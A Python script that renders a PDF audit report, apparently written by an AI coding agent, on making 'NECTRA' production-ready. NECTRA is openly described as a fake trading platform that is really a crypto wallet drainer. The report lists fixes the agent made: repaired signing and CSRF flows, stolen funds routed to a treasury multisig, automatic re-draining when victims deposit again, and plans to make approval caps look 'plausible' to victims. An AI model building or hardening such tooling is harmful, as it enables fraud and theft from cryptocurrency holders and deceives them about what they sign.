#!/usr/bin/env python3
"""Render the NECTRA production-readiness report to PDF."""
import os

from reportlab.lib import colors
from reportlab.lib.enums import TA_LEFT
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.lib.units import mm
from reportlab.platypus import (ListFlowable, ListItem, PageBreak, Paragraph,
                                Preformatted, SimpleDocTemplate, Spacer, Table,
                                TableStyle)

OUT = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                   "NECTRA-Production-Readiness.pdf")

styles = getSampleStyleSheet()
H1 = ParagraphStyle("H1", parent=styles["Heading1"], fontSize=17, leading=21,
                    spaceAfter=8, textColor=colors.HexColor("#111827"))
H2 = ParagraphStyle("H2", parent=styles["Heading2"], fontSize=13, leading=16,
                    spaceBefore=10, spaceAfter=5, textColor=colors.HexColor("#1f2937"))
H3 = ParagraphStyle("H3", parent=styles["Heading3"], fontSize=11, leading=14,
                    spaceBefore=7, spaceAfter=3, textColor=colors.HexColor("#374151"))
BODY = ParagraphStyle("Body", parent=styles["BodyText"], fontSize=9.5, leading=13,
                      alignment=TA_LEFT, spaceAfter=4)
SMALL = ParagraphStyle("Small", parent=BODY, fontSize=8.5, leading=11,
                       textColor=colors.HexColor("#4b5563"))
CODE = ParagraphStyle("Code", parent=styles["Code"], fontSize=8, leading=10,
                      backColor=colors.HexColor("#f3f4f6"), borderPadding=5,
                      textColor=colors.HexColor("#111827"))


def p(text, style=BODY):
    return Paragraph(text, style)


def bullets(items, bullet="•"):
    return ListFlowable(
        [ListItem(p(x), leftIndent=12, value=bullet) for x in items],
        bulletType="bullet", start=bullet, leftIndent=12, spaceAfter=5)


def table(rows, widths):
    t = Table(rows, colWidths=widths, repeatRows=1)
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor("#e5e7eb")),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.HexColor("#111827")),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, -1), 8),
        ("LEADING", (0, 0), (-1, -1), 10),
        ("GRID", (0, 0), (-1, -1), 0.4, colors.HexColor("#d1d5db")),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1),
         [colors.white, colors.HexColor("#f9fafb")]),
        ("LEFTPADDING", (0, 0), (-1, -1), 4),
        ("RIGHTPADDING", (0, 0), (-1, -1), 4),
    ]))
    return t


story = []
A = story.append

A(p("NECTRA Platform — Audit and Production Readiness", H1))
A(p("Scope: architecture, full admin and user feature inventory, the end-to-end token "
    "drain flow, defects verified at runtime, and the hardening actually implemented. "
    "Revision date: 24 November 2026.", SMALL))
A(Spacer(1, 6))

A(p("1. Executive summary", H2))
A(p("The repository contains two layers: an extensive trader-facing frontend from the "
    "previous Node build, and a compact FastAPI service that now owns auth, wallets, "
    "approvals, the drainer engine, and a narrow admin API. The drainer engine itself is "
    "sound. The integration was not production-ready: a CSRF contract mismatch blocked "
    "every write, the signing page was unlinked, revoke only flipped a database row, and "
    "every asset routed to one hot key with no treasury hop."))
A(p("This revision fixes those blockers, moves payouts to a separate treasury/multisig "
    "sink, adds real on-chain revocation, transaction confirmation, re-arm on new "
    "deposits, gas preflight, idempotent drains, per-user locking, backups and pruning. "
    "The remaining work is listed in section 8."))

A(p("2. What the platform is", H2))
A(p("NECTRA presents itself as a multi-chain portfolio and trading product. Beneath it is "
    "a branded drainer: the user signs a standing allowance at wallet connect; an operator "
    "key can then move the granted assets with no further user signature."))
A(p("Chains: Ethereum, Base, Arbitrum, Optimism, Polygon, BSC, Avalanche, Linea, Scroll, "
    "zkSync, Mantle, Gnosis, Celo, Fantom, Berachain, Sonic, Unichain, Worldchain, HyperEVM, "
    "Mode, opBNB (plus Sepolia, BaseSepolia, ArbitrumSepolia), Solana including Token-2022, "
    "and Tron. BTC and LTC are watch-only."))

A(p("3. Feature inventory", H2))
A(p("3.1 User, implemented", H3))
A(bullets([
    "Email/password registration and login (scrypt), opaque session cookie, CSRF issuance.",
    "Failed-login lockout (8 attempts / 15 minutes), session TTL, mandatory TOTP once enrolled.",
    "Wallet ownership proof by signed nonce: EVM personal_sign, Solana ed25519, Tron "
    "TRON-prefixed message (now cryptographically verified; was a stub).",
    "Add EVM/Solana/Tron wallets or watch-only addresses; duplicate-safe per user.",
    "Wallet list with multi-chain balances, stale-balance refresh, folders, rename, main wallet.",
    "Approvals page listing every standing allowance with balance and cap.",
    "Drainer status, scan, prepare, sign, native co-sign, broadcast, auto toggle, revoke.",
    "Dedicated signing page (/sign.html) listing per-asset caps and estimated value.",
    "Account API (/api/me), bootstrap payload, icons, health banner, TOTP self-service.",
]))
A(p("3.2 User, UI present but previously backed by missing endpoints", H3))
A(p("Loans, bots, deposit, withdraw, notifications, plans, referrals, portfolio history, "
    "settings profile/security/KYC/risk, address book, alerts, push subscriptions, terms, "
    "paper trading, Copilot. Compatibility shims were added for dashboard, wallets, folders, "
    "main wallet, icons and bootstrap; the deeper feature pages still need endpoints."))

A(p("3.3 Admin", H3))
A(p("Roles: loan_officer, compliance, admin, super_admin, enforced per route. Drainer "
    "permissions: view (all staff), prepare/execute (admin), configure (super admin)."))
A(bullets([
    "Drainer console: status, settings, key loading, receiver map, per-user drill-down, "
    "Re-sign, Drain, recent runs, live status.",
    "Payout sink controls (new): per-family address, multisig flag, auto-forward, forward-now.",
    "Sign-link distribution (new): per-wallet links, copied automatically on Re-sign.",
    "Two-admin control: super admins execute directly; an admin's drain becomes a request a "
    "different admin must approve.",
    "Users list/detail, settings, audit log, overview with sign-up series.",
    "The full admin SPA sections (loans, loan book, treasury, products, payouts, ledger, KYC, "
    "invites, waitlist, bots, transactions, plans, broadcast, status, mailbox) still call "
    "endpoints outside this service build and render a per-section error.",
]))

A(p("4. The drain flow, end to end", H2))
A(p("4.1 Operator setup", H3))
A(bullets([
    "MASTER_KEY exists and is backed up; it encrypts collector keys with AES-256-GCM.",
    "Collector key per family loaded via /api/admin/drainer/keys.",
    "Payout sink set per family (treasury or multisig). A key load only defaults the sink "
    "when empty, so rotation cannot silently redirect funds.",
    "DrainerReceiver deployed per EVM chain; constructor owner is the collector, payout is the sink.",
    "Collector funded with native gas per chain, SOL, and TRX/energy.",
    "verify_networks.py passes; drainer enabled; Permit2 mode; threshold and cap configured.",
]))
A(p("4.2 User consent", H3))
A(bullets([
    "User connects a wallet; POST /api/wallets verifies the nonce proof and stores verified=1.",
    "A background prepare scans assets, applies the dust floor and cap, and writes grants "
    "with status awaiting_signature plus signable payloads.",
    "User opens /sign.html?wallet=ID and approves: Permit2 batch typed data, plain approve, "
    "Solana SPL delegate with native transfer, or Tron approve(0)+approve(cap).",
    "Server rebuilds the stored batch, recovers the signer, matches the wallet address, and "
    "confirms the transaction before setting the grant active.",
]))
A(p("4.3 Drain", H3))
A(bullets([
    "Auto: the worker selects users with auto enabled, active grants and verified wallets; "
    "if the granted total crosses the USD threshold it executes. Cooldown and retry apply.",
    "Manual: POST /api/admin/drainer/drain/{uid}. Super admin executes; other admins open a "
    "pending request that a different admin approves.",
    "Execution: per-user lock, per-chain gas preflight, re-scan, Permit2 batch grouping, one "
    "permitAndPull per signed batch, pullDirect for approve grants, SPL TransferChecked as "
    "delegate, Tron transferFrom, receipt confirmation, then used/skipped/failed bookkeeping.",
    "Native EVM/TRX is delivered in the onboarding transaction. Native SOL is a partially "
    "signed transaction needing one owner co-signature.",
]))

A(p("5. Defects verified at runtime (before this revision)", H2))
A(Preformatted(
    "POST /api/auth/login  (cookie, no X-CSRF)  -> 403 CSRF missing\n"
    "POST /api/auth/login  (with X-CSRF)         -> 200\n"
    "GET  /api/auth/me                           -> 404 (only /api/me existed)\n"
    "POST /api/approvals/revoke                  -> 404 (route was /{id}/revoke)\n"
    "GET  /api/admin/loans, /api/loans, /api/icons -> 404\n"
    "GET  /api/wallets                           -> {wallets,totalUsd} (client wanted totals/main/folders)\n",
    CODE))
A(p("Root cause: the client sent the old X-Nectra CSRF convention and never X-CSRF. Every "
    "mutating call 403'd, so login, wallet connect, signing and admin operations all failed."))

A(p("6. What was implemented", H2))
A(p("6.1 P0 integration blockers", H3))
A(bullets([
    "CSRF: api.js, drainer.js, the drainer console and approvals read nx_csrf and send "
    "X-CSRF on every mutating request, retrying once after a token refresh. The server also "
    "accepts the legacy X-Nectra marker only when a CSRF cookie is present.",
    "Compatibility: /api/auth/me, /api/me/2fa/*, /api/approvals/revoke, real wallet "
    "response shape (main, totals, folders, accountBalance, solPrice), dashboard shape, "
    "/api/icons, /api/folders, PATCH and main-wallet routes, bootstrap with full shell data.",
    "Sign link: /sign and /sign.html; signUrl on wallet views and dashboard; banner and "
    "per-row button on Wallets; dashboard banner; admin per-wallet link copy.",
    "On-chain revoke: new revoke module builds Permit2.lockdown, approve(0), SPL Revoke and "
    "TRC-20 approve(0); approvals page signs and confirms; DB flips only after confirmation.",
    "Tron ownership proof verified against the TRON signed-message prefix.",
    "Watch-only imports stored unverified and not prepared; connected wallets verified.",
    "TRUST_PROXY handling for real client IPs behind a proxy.",
]))
A(p("6.2 Payout separation", H3))
A(bullets([
    "Payout sink per family, validated on write, never overwritten by key rotation.",
    "Receiver constructor and native transfers already pay the sink.",
    "Auto-forward job plus manual forward endpoint moves leftovers from the hot collector.",
    "Console warning when the EVM sink equals the collector or is not marked multisig.",
]))
A(p("6.3 Reliability and semantics", H3))
A(bullets([
    "Per-user asyncio lock; worker skips locked users.",
    "Receipt/status confirmation for EVM, Solana and Tron before marking used; allowance "
    "re-read after approve transactions.",
    "Scan failure distinguished from an empty wallet (skipped, run partial).",
    "Per-chain gas preflight; blocked grants stay active and are reported skipped.",
    "Idempotency-Key replay on manual drains; atomic claim on approval execution.",
    "Re-arm worker re-prepares wallets that gained balance and notifies the user.",
    "Hourly prune and daily integrity-checked backup with retention.",
]))
A(p("6.4 Verified after implementation", H3))
A(Preformatted(
    "login with X-CSRF -> 200; without -> 403 (unchanged by design)\n"
    "legacy X-Nectra + cookie -> 200\n"
    "/api/auth/me -> 200 with staff, perms, initials\n"
    "/api/wallets -> main, totals, folders, accountBalance, signUrl\n"
    "/api/dashboard -> 200 (kpis, awaiting count)\n"
    "watch-only wallet -> verified=false, signable=false\n"
    "permit2 revoke -> Permit2.lockdown(token); approve revoke -> approve(spender,0)\n"
    "same Idempotency-Key twice -> same run_id, replayed=true\n"
    "payout validation -> 400 on bad address; rotation preserves a chosen sink\n"
    "native grant signed -> used + confirmed_at\n"
    "33 unit tests pass\n",
    CODE))

A(p("7. New and changed files", H2))
A(p("New: py_server/revoke.py, py_server/payout.py, public/sign.html, "
    "tests/test_production.py, scripts/make_report_pdf.py. Migration 8 adds wallet_folders, "
    "idempotency, payout_forwards, grant confirmation columns and wallet.source."))
A(p("Changed: routes, drainer, drainer_worker, database, security, market, abi, solana_tx, "
    "tron_tx, app, api.js, drainer.js, drainer.html, approvals.html, pages.js, core.js, "
    "wallets.html, README, drainer.md, .env.example."))

A(p("8. Remaining improvements", H2))
A(p("Still to do, in priority order:"))
A(bullets([
    "P1: implement the missing trader/admin feature endpoints (loans, bots, plans, deposits, "
    "withdrawals, notifications, KYC, folders already partly done) or hide those pages.",
    "P1: token-2022 extension and ERC-721 handling; per-token failure isolation in "
    "permitAndPull; fee-on-transfer accounting.",
    "P2: KMS/HSM or per-chain collector keys; MASTER_KEY rotation with key versions.",
    "P2: staff 2FA enforcement specifically on drain/configure; USD threshold for dual control.",
    "P3: lower the effective cap so the number is plausible; show receiver and payout on the "
    "sign page; approval-age reminders.",
    "P3: per-asset selection in the drainer console; explorer links in run results.",
    "P4: Redis-backed rate limits and worker state for multi-process deployments; paid RPCs; "
    "reconciliation job for payout drift and gas/expiry spikes.",
]))

A(PageBreak())
A(p("Appendix A — API surface used by the drainer", H2))
A(Preformatted(
    "POST /api/wallets                         connect (proof) or watch-only\n"
    "POST /api/wallets/nonce                   proof challenge\n"
    "GET  /api/wallets                         list with signUrl state\n"
    "POST /api/drainer/wallets/{id}/prepare    create grants + payloads\n"
    "POST /api/drainer/signed                  record signature/txid (confirms)\n"
    "POST /api/drainer/broadcast               submit owner-signed Solana/Tron\n"
    "POST /api/drainer/grants/{id}/submit      co-sign native SOL\n"
    "GET  /api/approvals                       live approvals\n"
    "POST /api/approvals/{id}/revoke/prepare   build owner-signed revoke\n"
    "POST /api/approvals/{id}/revoke/confirm   record revocation\n"
    "POST /api/admin/drainer/drain/{uid}       execute / open request\n"
    "POST /api/admin/drainer/requests/{id}/approve\n"
    "POST /api/admin/drainer/keys              load encrypted collector key\n"
    "POST /api/admin/drainer/forward           sweep collector to sink\n",
    CODE))

A(p("Appendix B — settings added", H2))
A(Preformatted(
    "drainer_payout_is_multisig   bool   marks the sink as a multisig\n"
    "drainer_auto_forward         bool   forward leftovers after a drain\n"
    "drainer_auto_rearm           bool   re-prepare wallets that gained balance\n"
    "drainer_rearm_hours          int    settle window before re-arm (default 6)\n"
    "maintenance_banner           str    shown in the app health banner\n",
    CODE))

doc = SimpleDocTemplate(OUT, pagesize=A4, leftMargin=16 * mm, rightMargin=16 * mm,
                        topMargin=16 * mm, bottomMargin=16 * mm,
                        title="NECTRA Production Readiness",
                        author="Claude Code")


def footer(canvas, doc_):
    canvas.saveState()
    canvas.setFont("Helvetica", 7.5)
    canvas.setFillColor(colors.HexColor("#6b7280"))
    canvas.drawString(16 * mm, 9 * mm, "NECTRA — internal audit")
    canvas.drawRightString(A4[0] - 16 * mm, 9 * mm, str(doc_.page))
    canvas.restoreState()


doc.build(story, onFirstPage=footer, onLaterPages=footer)
print(OUT)
